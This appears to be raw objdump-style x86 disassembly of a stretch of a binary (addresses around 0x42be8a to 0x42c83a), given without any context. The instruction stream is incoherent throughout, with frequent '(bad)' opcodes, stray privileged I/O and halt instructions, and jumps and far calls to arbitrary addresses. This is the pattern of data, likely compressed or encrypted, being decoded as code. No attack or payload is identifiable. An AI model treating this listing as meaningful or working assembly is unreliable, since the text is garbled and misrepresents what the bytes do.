  42be8a:	sbb    BYTE PTR [ebp-0x78f36bc0],cl
  42be90:	aas    
	...
  42bef1:	add    BYTE PTR [eax],al
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bf2c
  42bf01:	xor    BYTE PTR [edx],bl
  42bf03:	sub    ebx,esp
  42bf05:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0x3b000001
  42bf0d:	popf   
  42bf0e:	cli    
  42bf0f:	jb     0x42bee4
  42bf11:	dec    edx
  42bf12:	cmp    BYTE PTR [esi-0x48edaf6],dl
  42bf18:	mov    al,0xe3
  42bf1a:	jmp    0x42bebc
  42bf1c:	jge    0x42bed7
  42bf1e:	lahf   
  42bf1f:	stos   DWORD PTR es:[edi],eax
  42bf20:	sar    BYTE PTR [edi-0x28],cl
  42bf23:	mov    cl,0x73
  42bf25:	push   edi
  42bf26:	pop    esp
  42bf27:	in     al,dx
  42bf28:	sbb    DWORD PTR [ebx-0xa],ebp
  42bf2b:	pop    ebx
  42bf2c:	cwde   
  42bf2d:	cdq    
  42bf2e:	in     eax,dx
  42bf2f:	xchg   esp,eax
  42bf30:	gs fld st(7)
  42bf33:	call   DWORD PTR [ebx]
  42bf35:	xchg   esp,eax
  42bf36:	(bad)  
  42bf37:	loope  0x42bf77
  42bf39:	sbb    ebp,edx
  42bf3b:	xlat   BYTE PTR ds:[ebx]
  42bf3c:	out    dx,eax
  42bf3d:	js     0x42bf84
  42bf3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf40:	and    al,0x9c
  42bf42:	push   edx
  42bf43:	test   BYTE PTR [ebx],0x33
  42bf46:	sub    ebp,DWORD PTR [ecx+0x4dbc4623]
  42bf4c:	scas   eax,DWORD PTR es:[edi]
  42bf4d:	cld    
  42bf4e:	inc    edx
  42bf4f:	xchg   esp,eax
  42bf50:	xlat   BYTE PTR ds:[ebx]
  42bf51:	mov    eax,ds:0x77d014bb
  42bf56:	test   BYTE PTR [eax-0x75],al
  42bf59:	inc    ecx
  42bf5a:	imul   ebp,DWORD PTR [edx-0x164ba334],0x8a4c05ec
  42bf64:	ret    
  42bf65:	inc    ebx
  42bf66:	push   esp
  42bf67:	mov    ebx,0x63bdc731
  42bf6c:	adc    ch,0x65
  42bf6f:	imul   edi,DWORD PTR [ecx],0x519a4fe0
  42bf75:	out    dx,al
  42bf76:	in     eax,0x3d
  42bf78:	mov    ebx,0x16b4bd6c
  42bf7d:	test   BYTE PTR [eax+0x7ee4ff3f],dl
  42bf83:	jp     0x42bf3c
  42bf85:	pop    edi
  42bf86:	jbe    0x42bfca
  42bf88:	and    edi,DWORD PTR [ecx]
  42bf8a:	lea    eax,[eax-0x5e]
  42bf8d:	pushw  cs
  42bf8f:	pop    esi
  42bf90:	jnp    0x42bf65
  42bf92:	retf   0x1f3a
  42bf95:	pop    esp
  42bf96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf97:	push   cs
  42bf98:	je     0x42bfab
  42bf9a:	cmp    eax,0x8e81a98b
  42bf9f:	jg     0x42bfef
  42bfa1:	and    DWORD PTR [esi],ebx
  42bfa3:	push   edi
  42bfa4:	dec    ebx
  42bfa5:	jp     0x42c025
  42bfa7:	adc    eax,0xfd9e591c
  42bfac:	mov    ah,BYTE PTR [edi+eiz*1]
  42bfaf:	ins    DWORD PTR es:[edi],dx
  42bfb0:	or     ecx,ecx
  42bfb2:	xor    ch,cl
  42bfb4:	popa   
  42bfb5:	cld    
  42bfb6:	in     eax,0x84
  42bfb8:	dec    edx
  42bfb9:	jmp    0x42bfb6
  42bfbb:	or     ebp,edi
  42bfbd:	stc    
  42bfbe:	jge    0x42c000
  42bfc0:	aam    0x23
  42bfc2:	rcr    DWORD PTR [eax-0x28],1
  42bfc5:	mov    esp,0xdd173b27
  42bfca:	in     eax,dx
  42bfcb:	lahf   
  42bfcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfcd:	fisubr WORD PTR [esi+0x33]
  42bfd0:	div    DWORD PTR [esi-0x3ad40cf5]
  42bfd6:	int    0x91
  42bfd8:	ss daa 
  42bfda:	dec    ecx
  42bfdb:	add    BYTE PTR [ecx-0x48],dh
  42bfde:	repz xor al,0x17
  42bfe1:	add    DWORD PTR [edi],esp
  42bfe3:	xor    esp,edx
  42bfe5:	cs ja  0x42c020
  42bfe8:	ds jecxz 0x42bfc3
  42bfeb:	dec    esi
  42bfec:	lea    ecx,[ebx-0x65]
  42bfef:	adc    BYTE PTR [edx+0x32414ba4],0x83
  42bff6:	pop    ebx
  42bff7:	hlt    
  42bff8:	stos   DWORD PTR es:[edi],eax
  42bff9:	mov    dh,0xf6
  42bffb:	gs call 0xdd494af5
  42c001:	xchg   ebx,eax
  42c002:	jecxz  0x42bfc3
  42c004:	fldenv [ecx-0x334593e7]
  42c00a:	into   
  42c00b:	add    al,0xb5
  42c00d:	jle    0x42bfdd
  42c00f:	test   al,0x35
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	test   DWORD PTR [eax-0x64],0x1d7e135
  42c087:	add    BYTE PTR ds:0x85000001,al
  42c08d:	mov    ah,0x57
  42c08f:	jl     0x42c0d5
  42c091:	js     0x42c0f7
  42c093:	add    DWORD PTR ds:0xd08ea352,esp
  42c099:	cld    
  42c09a:	shr    DWORD PTR [edi],cl
  42c09c:	fiadd  DWORD PTR [esi-0x6c2c960b]
  42c0a2:	xor    eax,0xde6175a4
  42c0a7:	or     DWORD PTR [esi-0xc061b50],eax
  42c0ad:	stos   DWORD PTR es:[edi],eax
  42c0ae:	add    BYTE PTR [ecx-0x13],ch
  42c0b1:	inc    ebx
  42c0b2:	add    ah,BYTE PTR [esi+0x2a]
  42c0b5:	std    
  42c0b6:	push   ebx
  42c0b7:	cmp    BYTE PTR [edx+0x17],ah
  42c0ba:	mov    ecx,DWORD PTR ss:[ebx+0x46]
  42c0be:	push   0x7f61d44f
  42c0c3:	xchg   esp,eax
  42c0c4:	stos   BYTE PTR es:[edi],al
  42c0c5:	pop    edi
  42c0c6:	mov    esp,0x796a81fc
  42c0cb:	mov    edx,DWORD PTR [ebx+0xa]
  42c0ce:	add    ecx,DWORD PTR [eax+0x36]
  42c0d1:	inc    ebx
  42c0d2:	cld    
  42c0d3:	add    al,0x22
  42c0d5:	repnz sub dl,BYTE PTR [ebp+0x64560c5d]
  42c0dc:	or     DWORD PTR [esi-0x7e],edi
  42c0df:	fcmovnb st,st(0)
  42c0e1:	jecxz  0x42c085
  42c0e3:	push   es
  42c0e4:	dec    eax
  42c0e5:	retf   0xf893
  42c0e8:	inc    ebp
  42c0e9:	push   es
  42c0ea:	sbb    BYTE PTR [eax],cl
  42c0ec:	mov    ecx,0x58805238
  42c0f1:	xor    eax,0x1081eda3
  42c0f6:	retf   0x7fa2
  42c0f9:	pop    edx
  42c0fa:	outs   dx,BYTE PTR ds:[esi]
  42c0fb:	(bad)  
  42c0fc:	sbb    ah,BYTE PTR [ecx+0x1d773e65]
  42c102:	xlat   BYTE PTR ds:[ebx]
  42c103:	out    0xa0,al
  42c105:	shr    DWORD PTR [edx],cl
  42c107:	stos   DWORD PTR es:[edi],eax
  42c108:	xor    DWORD PTR [esi-0x35],eax
  42c10b:	mov    ds:0xbd01dd58,eax
  42c110:	push   ebp
  42c111:	imul   esi,DWORD PTR [ebp+0x17],0xffffffa6
  42c115:	add    eax,0xc794890a
  42c11a:	jne    0x42c0b7
  42c11c:	mov    bl,ah
  42c11e:	ins    BYTE PTR es:[edi],dx
  42c11f:	inc    ebp
  42c120:	sub    BYTE PTR [eax-0x63a95320],al
  42c126:	cli    
  42c127:	adc    dh,0xa0
  42c12a:	cmp    eax,0x4d4d84
  42c12f:	jne    0x42c0b3
  42c131:	rcl    BYTE PTR [edx*1+0x607e7fd8],0x7a
  42c139:	(bad)  
  42c13a:	loopne 0x42c1a1
  42c13c:	jns    0x42c18a
  42c13e:	cdq    
  42c13f:	aaa    
  42c140:	xor    al,0xac
  42c142:	ins    DWORD PTR es:[edi],dx
  42c143:	mov    cs,ebp
  42c145:	dec    ebx
  42c146:	in     eax,0xc3
  42c148:	stc    
  42c149:	adc    esp,ebp
  42c14b:	arpl   WORD PTR [eax],di
  42c14d:	ins    DWORD PTR es:[edi],dx
  42c14e:	loope  0x42c173
  42c150:	inc    esp
  42c151:	scas   al,BYTE PTR es:[edi]
  42c152:	xor    esp,DWORD PTR [eax]
  42c154:	dec    eax
  42c155:	shl    al,1
  42c157:	inc    ebx
  42c158:	rol    DWORD PTR [edi+ebx*4],1
  42c15b:	cmp    DWORD PTR [esi-0x15f213c6],0xffffffc7
  42c162:	jg     0x42c0fa
  42c164:	fidivr DWORD PTR [edx+eax*4]
  42c167:	xchg   ah,al
  42c169:	sbb    al,0x4d
  42c16b:	and    ah,cl
  42c16d:	vandnps xmm7,xmm4,XMMWORD PTR [eax+0x777d8cfd]
  42c175:	push   0x98ed2f40
  42c17a:	dec    ebx
  42c17b:	and    DWORD PTR [ebp+0x60],ebx
  42c17e:	ja     0x42c18a
  42c180:	out    0x24,eax
  42c182:	pop    esp
  42c183:	lds    edx,FWORD PTR [edx-0xe]
  42c186:	std    
  42c187:	jg     0x42c129
  42c189:	mov    WORD PTR [eax-0x1b973d89],ds
  42c18f:	jb     0x42c1a9
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	push   0xffffffe0
  42c202:	lods   eax,DWORD PTR ds:[esi]
  42c203:	xchg   edx,eax
  42c204:	out    0xd8,al
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    eax,0x62000001
  42c20d:	push   0x3b
  42c20f:	and    al,0x90
  42c211:	in     eax,dx
  42c212:	test   BYTE PTR [edi+0x6a],ah
  42c215:	jmp    0x42c1ec
  42c217:	sub    ah,BYTE PTR [ebx]
  42c219:	repz in al,dx
  42c21b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c21c:	sahf   
  42c21d:	out    dx,al
  42c21e:	cmp    al,0x5b
  42c220:	jle    0x42c234
  42c222:	xchg   esp,eax
  42c223:	int    0xe5
  42c225:	xor    bl,dl
  42c227:	in     eax,dx
  42c228:	mul    BYTE PTR [edi+0x2db33d8b]
  42c22e:	inc    edx
  42c22f:	in     al,0x3f
  42c231:	adc    esp,ebx
  42c233:	fnsave [ebp+0xa37c49]
  42c239:	retf   
  42c23a:	sti    
  42c23b:	jle    0x42c244
  42c23d:	push   ss
  42c23e:	fstp   st(6)
  42c240:	mov    WORD PTR [esi-0x53],ds
  42c243:	pop    eax
  42c244:	rcl    DWORD PTR [esi],cl
  42c246:	or     ebp,DWORD PTR [ecx+ebx*4-0x68]
  42c24a:	push   eax
  42c24b:	std    
  42c24c:	mov    ecx,0xe574096a
  42c251:	pop    esi
  42c252:	cli    
  42c253:	ds jns 0x42c256
  42c256:	inc    edi
  42c257:	daa    
  42c258:	icebp  
  42c259:	(bad)  
  42c25a:	ficomp DWORD PTR [eax]
  42c25c:	xchg   ebx,eax
  42c25d:	inc    edi
  42c25e:	fcomp  DWORD PTR [esi-0x3d]
  42c261:	sbb    edx,ebp
  42c263:	inc    ecx
  42c264:	aad    0xda
  42c266:	and    al,0x15
  42c268:	retf   
  42c269:	hlt    
  42c26a:	in     eax,dx
  42c26b:	rcl    DWORD PTR [ecx+eiz*8-0x6bc75cc7],1
  42c272:	cmc    
  42c273:	(bad)  
  42c274:	pop    ebp
  42c275:	adc    BYTE PTR [eax+0x3a],dl
  42c278:	mov    edi,0xf75c56a
  42c27d:	rol    ecx,cl
  42c27f:	push   0xd
  42c281:	icebp  
  42c282:	clc    
  42c283:	mov    ebp,0xb2b9a517
  42c288:	cwde   
  42c289:	or     esi,DWORD PTR [ecx+0x6d]
  42c28c:	mov    esi,0xc829bad0
  42c291:	ins    BYTE PTR es:[edi],dx
  42c292:	inc    esp
  42c293:	dec    edi
  42c294:	call   0x86f3f421
  42c299:	retf   
  42c29a:	xchg   ebp,eax
  42c29b:	sbb    bl,BYTE PTR [ecx-0x2e6fe4c9]
  42c2a1:	xchg   ebx,eax
  42c2a2:	jmp    0x42c2f0
  42c2a4:	inc    edx
  42c2a5:	stc    
  42c2a6:	dec    esi
  42c2a7:	cmp    eax,0xfb83baa1
  42c2ac:	leave  
  42c2ad:	ror    BYTE PTR [ebp+0x38],0x38
  42c2b1:	nop    DWORD PTR [ebp+0xc]
  42c2b5:	dec    esp
  42c2b6:	cmp    eax,0x58f72428
  42c2bb:	pushf  
  42c2bc:	jbe    0x42c291
  42c2be:	ds fs jae 0x42c276
  42c2c2:	xor    DWORD PTR [esi],edx
  42c2c4:	push   esi
  42c2c5:	ret    0x14f0
  42c2c8:	shl    DWORD PTR [ebx+0x30015760],cl
  42c2ce:	out    0x3d,al
  42c2d0:	push   esp
  42c2d1:	outs   dx,DWORD PTR ds:[esi]
  42c2d2:	pop    edi
  42c2d3:	add    edi,DWORD PTR [ecx-0x4e]
  42c2d6:	adc    eax,0xcc30898
  42c2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2dc:	jp     0x42c2e1
  42c2de:	add    BYTE PTR [eax+esi*4],bh
  42c2e1:	mov    BYTE PTR ds:0x839e63e9,dh
  42c2e7:	lea    edx,[ecx-0x576a777c]
  42c2ed:	popf   
  42c2ee:	mov    al,ds:0x19681058
  42c2f3:	mov    BYTE PTR [edi],ah
  42c2f5:	idiv   bh
  42c2f7:	jle    0x42c33b
  42c2f9:	sbb    al,0xda
  42c2fb:	inc    esi
  42c2fc:	cwde   
  42c2fd:	test   dl,0xcc
  42c300:	cli    
  42c301:	sbb    al,0x5
  42c303:	mov    bh,0xc5
  42c305:	jnp    0x42c2e3
  42c307:	xor    DWORD PTR [edx+0x11],edi
  42c30a:	addr16 pop ebx
  42c30c:	lods   eax,DWORD PTR ds:[esi]
  42c30d:	test   BYTE PTR ds:0xe890,0x0
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x72bc5ff6
  42c383:	xor    ebx,ebp
  42c385:	fld    DWORD PTR [ecx]
  42c387:	add    BYTE PTR ds:0x98000001,al
  42c38d:	enter  0xf57d,0xa2
  42c391:	jmp    0xaf27:0x23be539f
  42c398:	inc    edi
  42c399:	push   edx
  42c39a:	jbe    0x42c360
  42c39c:	xchg   BYTE PTR [edx-0x32064ddb],al
  42c3a2:	lods   eax,DWORD PTR ds:[esi]
  42c3a3:	(bad)  
  42c3a4:	mov    BYTE PTR [ebp+0x1d],0x12
  42c3a8:	loope  0x42c37f
  42c3aa:	in     al,dx
  42c3ab:	adc    eax,edi
  42c3ad:	dec    ebp
  42c3ae:	mov    BYTE PTR [edi],al
  42c3b0:	(bad)  [esi]
  42c3b2:	sbb    DWORD PTR [ecx+0x48920730],edi
  42c3b8:	mov    ebx,0x4ef99db0
  42c3bd:	xchg   esi,eax
  42c3be:	cmp    al,0xf1
  42c3c0:	test   eax,0x244eb00b
  42c3c5:	and    BYTE PTR [ebp+ebp*4-0x1f],al
  42c3c9:	sub    BYTE PTR [edx],0x77
  42c3cc:	mov    fs,eax
  42c3ce:	push   eax
  42c3cf:	ja     0x42c3d6
  42c3d1:	hlt    
  42c3d2:	jp     0x42c40d
  42c3d4:	stc    
  42c3d5:	inc    ecx
  42c3d6:	call   0x734ef4f5
  42c3db:	push   ds
  42c3dc:	sub    esp,0xffffff89
  42c3df:	push   edi
  42c3e0:	dec    edi
  42c3e1:	stos   BYTE PTR es:[edi],al
  42c3e2:	pop    edi
  42c3e3:	sti    
  42c3e4:	ficomp WORD PTR [esi+0x246bbe5e]
  42c3ea:	dec    edx
  42c3eb:	xchg   esp,eax
  42c3ec:	arpl   WORD PTR [ecx+0xcf318c6],di
  42c3f2:	fwait
  42c3f3:	push   eax
  42c3f4:	outs   dx,DWORD PTR ds:[esi]
  42c3f5:	and    ah,cl
  42c3f7:	inc    esp
  42c3f8:	mov    DWORD PTR [esi+0x24ddacb2],0x50528183
  42c402:	adc    cl,dh
  42c404:	jnp    0x42c3d6
  42c406:	ss mov ecx,0x329675d9
  42c40c:	repnz mov edi,0x4e597c99
  42c412:	ret    
  42c413:	dec    ebx
  42c414:	ins    BYTE PTR es:[edi],dx
  42c415:	scas   al,BYTE PTR es:[edi]
  42c416:	add    eax,0x9f1a407e
  42c41b:	lods   al,BYTE PTR ds:[esi]
  42c41c:	ds (bad) 
  42c41e:	in     eax,dx
  42c41f:	fiadd  DWORD PTR [edi+0x675b6cb0]
  42c425:	mov    dl,0x33
  42c427:	jno    0x42c3af
  42c429:	(bad)  
  42c42a:	imul   esp,DWORD PTR [edi],0xac734d5a
  42c430:	fdivr  QWORD PTR [ecx-0x74]
  42c433:	xor    ebx,edx
  42c435:	push   esp
  42c436:	retf   0xc17c
  42c439:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42c43b:	xchg   edi,eax
  42c43c:	mov    esi,DWORD PTR [edi+eiz*2]
  42c43f:	push   esp
  42c440:	retf   0x31d7
  42c443:	es jnp 0x42c42d
  42c446:	add    dl,cl
  42c448:	push   edi
  42c449:	dec    ebp
  42c44a:	call   DWORD PTR [edi-0x5b]
  42c44d:	test   BYTE PTR [esi-0x560dcb64],dl
  42c453:	jb     0x42c405
  42c455:	or     ch,bh
  42c457:	mov    BYTE PTR [eax],ch
  42c459:	stos   BYTE PTR es:[edi],al
  42c45a:	inc    edi
  42c45b:	sub    bl,ah
  42c45d:	push   ds
  42c45e:	cld    
  42c45f:	pop    esi
  42c460:	add    esp,DWORD PTR [ecx+0x35]
  42c463:	cmp    DWORD PTR [ebp-0x59],esp
  42c466:	push   0xd18d088c
  42c46b:	sar    DWORD PTR [ebp+0x2],0xbd
  42c46f:	fwait
  42c470:	fwait
  42c471:	(bad)  
  42c472:	cld    
  42c473:	fmul   DWORD PTR [ebx]
  42c475:	pop    edi
  42c476:	(bad)  
  42c477:	dec    edx
  42c478:	mov    bh,0xa6
  42c47a:	(bad)  
  42c47b:	jnp    0x42c4bd
  42c47d:	call   0x42f7:0x891fb941
  42c484:	xchg   edi,eax
  42c485:	ss sub bh,cl
  42c488:	or     al,0xe
  42c48a:	add    BYTE PTR [edx],dl
  42c48c:	nop
  42c48d:	lods   eax,DWORD PTR ds:[esi]
  42c48e:	mov    edi,DWORD PTR [ecx+0x7f]
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xc434,0x4a
  42c502:	sahf   
  42c503:	add    eax,esi
  42c505:	fiadd  DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0x62000001,al
  42c50d:	pop    ecx
  42c50e:	adc    cl,BYTE PTR [esi+ecx*2-0x2d0a5612]
  42c515:	sub    DWORD PTR [esi],ebx
  42c517:	imul   bp,ax,0xffda
  42c51b:	push   es
  42c51c:	in     al,0xa0
  42c51e:	xchg   ecx,eax
  42c51f:	or     esi,DWORD PTR [edi-0x3c108d13]
  42c525:	shl    BYTE PTR [edx+0x69bc1cc2],0x86
  42c52c:	lahf   
  42c52d:	cli    
  42c52e:	or     esi,DWORD PTR [edi]
  42c530:	inc    edi
  42c531:	jne    0x42c4f6
  42c533:	retf   0xdabb
  42c536:	into   
  42c537:	dec    eax
  42c538:	bound  edx,QWORD PTR [esi+0x5]
  42c53b:	push   0x870ea9d0
  42c540:	sub    eax,0x29bbf2f7
  42c545:	pop    eax
  42c546:	mul    DWORD PTR [esi+0x1c]
  42c549:	retf   0x828c
  42c54c:	repnz retf 
  42c54e:	enter  0xd0f1,0x86
  42c552:	(bad)  
  42c553:	mov    DWORD PTR [edx+ecx*2],eax
  42c556:	cmp    ebp,eax
  42c558:	dec    ecx
  42c559:	imul   edi,DWORD PTR [esi+ebp*4],0x7f
  42c55d:	add    eax,0x300ca3b
  42c562:	mov    ebx,0x820b466d
  42c567:	lods   al,BYTE PTR ds:[esi]
  42c568:	push   esp
  42c569:	pushf  
  42c56a:	jns    0x42c50a
  42c56c:	rcr    BYTE PTR [ebx-0x45abf306],1
  42c572:	out    dx,eax
  42c573:	hlt    
  42c574:	inc    ecx
  42c575:	leave  
  42c576:	fldenv [ebp+esi*4-0x7e]
  42c57a:	or     eax,0x99e907f9
  42c57f:	int    0x25
  42c581:	pop    ecx
  42c582:	xchg   ebp,eax
  42c583:	jl     0x42c599
  42c585:	pushf  
  42c586:	jo     0x42c5b3
  42c588:	dec    esi
  42c589:	fsubr  DWORD PTR [eax+0x6]
  42c58c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c58d:	sbb    al,0x1a
  42c58f:	out    0x91,eax
  42c591:	sahf   
  42c592:	popa   
  42c593:	into   
  42c594:	add    BYTE PTR [ebx+0x55774bfb],al
  42c59a:	dec    ecx
  42c59b:	jno    0x42c562
  42c59d:	in     eax,0x91
  42c59f:	fst    QWORD PTR [eax-0x4e]
  42c5a2:	dec    edx
  42c5a3:	push   0xffffff9c
  42c5a5:	jg     0x42c60d
  42c5a7:	push   0x8350aebc
  42c5ac:	cmc    
  42c5ad:	push   edx
  42c5ae:	add    cl,BYTE PTR [ebx+eax*8-0x65]
  42c5b2:	out    0xce,eax
  42c5b4:	iret   
  42c5b5:	test   eax,0xc5bc9cb6
  42c5ba:	out    dx,al
  42c5bb:	xor    ebp,DWORD PTR [ecx]
  42c5bd:	push   edx
  42c5be:	adc    ecx,DWORD PTR [edi]
  42c5c0:	stos   DWORD PTR es:[edi],eax
  42c5c1:	add    al,0xec
  42c5c3:	add    BYTE PTR [esi],0x37
  42c5c6:	in     eax,dx
  42c5c7:	icebp  
  42c5c8:	mov    dh,0xe1
  42c5ca:	mov    bp,0x5b01
  42c5ce:	popa   
  42c5cf:	das    
  42c5d0:	adc    ecx,DWORD PTR [edx+0x4]
  42c5d3:	outs   dx,BYTE PTR ds:[esi]
  42c5d4:	sub    DWORD PTR [edi+0x7a68de1a],esi
  42c5da:	jne    0x42c650
  42c5dc:	or     ebp,eax
  42c5de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5df:	or     eax,0x5480effc
  42c5e4:	pop    edx
  42c5e5:	leave  
  42c5e6:	sub    esi,DWORD PTR [eax]
  42c5e8:	xor    al,bh
  42c5ea:	imul   edx,DWORD PTR [ebx+edx*8-0x4d65fc27],0xffffffbf
  42c5f2:	dec    eax
  42c5f3:	retf   0x343f
  42c5f6:	hlt    
  42c5f7:	lods   al,BYTE PTR ds:[esi]
  42c5f8:	dec    ecx
  42c5f9:	mov    esp,0x174f3829
  42c5fe:	sbb    BYTE PTR [ecx+0x682d4b8f],dl
  42c604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c605:	cld    
  42c606:	and    eax,ebp
  42c608:	mov    bh,0xd6
  42c60a:	or     edx,ecx
  42c60c:	adc    al,0xad
  42c60e:	cwde   
  42c60f:	std    
  42c610:	add    al,0x0
	...
  42c672:	add    BYTE PTR [eax],al
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x156dfc6b]
  42c681:	sbb    al,0x3d
  42c683:	xor    ebp,0xffffffdb
  42c686:	add    DWORD PTR [eax],eax
  42c688:	add    eax,0xb5000001
  42c68d:	jnp    0x42c60f
  42c68f:	adc    DWORD PTR ds:0xdc172f3b,edx
  42c695:	inc    ebx
  42c696:	in     eax,dx
  42c697:	clc    
  42c698:	test   BYTE PTR [ecx],bh
  42c69a:	sbb    eax,0x45f6dee4
  42c69f:	rol    ebp,1
  42c6a1:	dec    esp
  42c6a2:	adc    ebp,edi
  42c6a4:	pop    ds
  42c6a5:	dec    edi
  42c6a6:	loop   0x42c64f
  42c6a8:	cld    
  42c6a9:	call   0x9d442e52
  42c6ae:	popa   
  42c6af:	icebp  
  42c6b0:	adc    DWORD PTR fs:[edi],ecx
  42c6b3:	add    al,BYTE PTR [edx]
  42c6b5:	xchg   ecx,eax
  42c6b6:	rol    BYTE PTR [eax],1
  42c6b8:	ret    0x9229
  42c6bb:	fstp   DWORD PTR [ecx+ebx*8+0x68]
  42c6bf:	or     al,0x16
  42c6c1:	xor    eax,0x3e6e3435
  42c6c6:	add    BYTE PTR [edi-0x7ce01a7c],cl
  42c6cc:	repnz mov dh,0x8b
  42c6cf:	pop    es
  42c6d0:	in     eax,dx
  42c6d1:	jmp    0xf4100bb2
  42c6d6:	call   0x8061:0x6f9cead2
  42c6dd:	inc    ebx
  42c6de:	adc    bl,bh
  42c6e0:	or     al,0x6a
  42c6e2:	sub    ecx,DWORD PTR [esi]
  42c6e4:	inc    ebx
  42c6e5:	(bad)  
  42c6e6:	mov    eax,ds:0x8e759c67
  42c6eb:	xlat   BYTE PTR ds:[ebx]
  42c6ec:	dec    esi
  42c6ed:	aaa    
  42c6ee:	data16 std 
  42c6f0:	aaa    
  42c6f1:	ins    BYTE PTR es:[edi],dx
  42c6f2:	push   ebp
  42c6f3:	fdiv   DWORD PTR ds:0xa3622707
  42c6f9:	sub    DWORD PTR [ecx-0x38],ecx
  42c6fc:	loope  0x42c684
  42c6fe:	push   es
  42c6ff:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42c701:	out    0x83,al
  42c703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c704:	lds    esp,FWORD PTR [esi-0x26]
  42c707:	outs   dx,BYTE PTR ds:[esi]
  42c708:	xor    eax,0x646f2a04
  42c70d:	loopne 0x42c6bd
  42c70f:	and    eax,0xe7519691
  42c714:	pushf  
  42c715:	push   esi
  42c716:	fiadd  DWORD PTR ds:0x2e34e8e9
  42c71c:	aas    
  42c71d:	cmp    al,BYTE PTR [esi+0x45]
  42c720:	lea    eax,[eax]
  42c722:	mov    bl,0x5
  42c724:	scas   al,BYTE PTR es:[edi]
  42c725:	xor    dh,BYTE PTR [edi+0x4f]
  42c728:	enter  0x2503,0x26
  42c72c:	fsubr  QWORD PTR [ecx+0x2a57c899]
  42c732:	mov    dh,0xb1
  42c734:	and    BYTE PTR [esi+0x42016970],al
  42c73a:	mov    ds:0x9562f637,al
  42c73f:	test   DWORD PTR [edx-0x58],esi
  42c742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c743:	sbb    cl,ch
  42c745:	cmp    eax,0xaa54e362
  42c74a:	mov    edi,0x29c9905a
  42c74f:	mov    BYTE PTR [edi],0xff
  42c752:	(bad)  
  42c753:	push   ebp
  42c754:	cmp    eax,0xfae2e4e4
  42c759:	add    cl,bl
  42c75b:	dec    edi
  42c75c:	xchg   DWORD PTR [esi],edx
  42c75e:	xlat   BYTE PTR gs:[ebx]
  42c760:	imul   eax,DWORD PTR [edx],0xffffffcf
  42c763:	stos   DWORD PTR es:[edi],eax
  42c764:	mov    eax,ds:0xf12335a6
  42c769:	(bad)  
  42c76a:	loope  0x42c71a
  42c76c:	mov    ds:0x58c383de,al
  42c771:	cmp    esi,DWORD PTR [edx+0x7a]
  42c774:	dec    esi
  42c775:	pop    esp
  42c776:	inc    ecx
  42c777:	pop    ecx
  42c778:	mov    DWORD PTR [edi+0x76],esp
  42c77b:	cmp    al,0x8
  42c77d:	sub    eax,0x58ba6daf
  42c782:	jae    0x42c71a
  42c784:	dec    eax
  42c785:	cmp    DWORD PTR [edx-0x11],ebp
  42c788:	stos   BYTE PTR es:[edi],al
  42c789:	mov    dh,0x4a
  42c78b:	das    
  42c78c:	mov    ah,0x64
  42c78e:	inc    ecx
  42c78f:	lods   al,BYTE PTR ds:[esi]
  42c790:	(bad)  
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0x8741a40e
  42c802:	mov    edi,0x1dcfa69
  42c807:	add    BYTE PTR ds:0xd9000001,al
  42c80d:	mov    ch,0xc4
  42c80f:	nop
  42c810:	cmp    ebx,eax
  42c812:	bound  esi,QWORD PTR [ecx+0x77]
  42c815:	pop    ds
  42c816:	lea    ebx,[edx-0x4b04c891]
  42c81c:	and    edx,edx
  42c81e:	adc    dh,BYTE PTR [esi+0x23]
  42c821:	not    DWORD PTR [eax]
  42c823:	mov    esi,0x2a947a3f
  42c828:	adc    BYTE PTR [esi+0x52],bh
  42c82b:	aaa    
  42c82c:	lock cmc 
  42c82e:	sahf   
  42c82f:	and    bh,BYTE PTR [esi-0x56]
  42c832:	xor    BYTE PTR [eax],dh
  42c834:	jl     0x42c7fa
  42c836:	imul   edi
  42c838:	jnp    0x42c89b
  42c83a:	push   cs
